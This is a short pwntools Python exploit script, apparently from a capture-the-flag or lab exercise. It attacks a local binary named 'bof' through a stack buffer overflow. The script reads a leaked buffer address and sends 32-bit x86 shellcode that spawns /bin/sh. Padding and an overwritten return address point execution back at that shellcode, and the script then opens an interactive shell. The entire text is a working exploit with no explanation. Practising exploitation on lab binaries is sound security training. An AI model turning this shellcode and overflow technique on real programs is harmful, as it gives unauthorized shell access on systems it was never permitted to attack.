from pwn import *

p = process("./bof")

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

buf_size = 0x80

p.recvuntil("buf: ")
buf_addr = int(p.recv(10), 0)

payload = shellcode
payload += b"A"*(buf_size + 4 - len(shellcode))
payload += p32(buf_addr)

p.sendline(payload)

p.interactive()